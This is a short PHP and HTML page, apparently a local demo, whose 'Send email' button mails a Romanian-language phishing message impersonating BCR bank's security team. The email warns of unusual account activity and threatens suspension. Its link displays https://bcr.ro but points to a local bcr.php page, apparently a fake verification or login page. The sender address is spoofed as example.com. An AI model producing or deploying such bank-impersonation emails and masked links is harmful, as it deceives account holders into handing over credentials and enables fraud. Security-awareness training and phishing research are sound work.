<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trimitere email</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 20px auto;
            padding: 20px;
        }
        label {
            display: block;
            margin-bottom: 5px;
        }
        input[type="text"], input[type="email"] {
            width: 100%;
            padding: 8px;
            margin-bottom: 10px;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            padding: 10px 15px;
            border: none;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        .message {
            margin-top: 15px;
            padding: 10px;
            border: 1px solid #ccc;
        }
        .success {
            background-color: #dff0d8;
            color: #3c763d;
        }
        .error {
            background-color: #f2dede;
            color: #a94442;
        }
    </style>
</head>
<body>
    <h2>Trimitere email</h2>
    <form action="index.php" method="post">
        <input type="submit" value="Send email">
    </form>

    <?php
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $to = "sabinstan19@gmail.com";
        $subject = "Acțiune urgentă necesară pentru contul tău bancar";
        $message = "
        <html>
        <head>
            <title>Acțiune urgentă necesară pentru contul tău bancar</title>
        </head>
        <body>
            <p>Dragă client,</p>
            <p>Am detectat activități neobișnuite în contul tău bancar care necesită atenția imediată. 
            Pentru a preveni orice acces neautorizat, este imperativ să verifici activitatea contului cât mai curând posibil.</p>

            <p>Te rugăm să accesezi imediat linkul de mai jos pentru a confirma identitatea ta și a revizui activitatea recentă a contului:</p>
            
            <p><a href='http://localhost:8080/bcr.php' target='_blank'>https://bcr.ro</a></p>

            <p>Neglijarea acestui mesaj poate duce la suspendarea temporară a accesului la serviciile noastre online.</p>

            <p>Cu stimă,</p>
            <p>Echipa de Securitate a Băncii BCR</p>
        </body>
        </html>
        ";

        $headers = "From: sender@example.com";
        $headers .= "\r\nContent-Type: text/html; charset=UTF-8";

        if (mail($to, $subject, $message, $headers)) {
            echo '<div class="message success">Email trimis cu succes.</div>';
        } else {
            echo '<div class="message error">Eroare la trimiterea emailului!</div>';
        }
    }
    ?>

</body>
</html>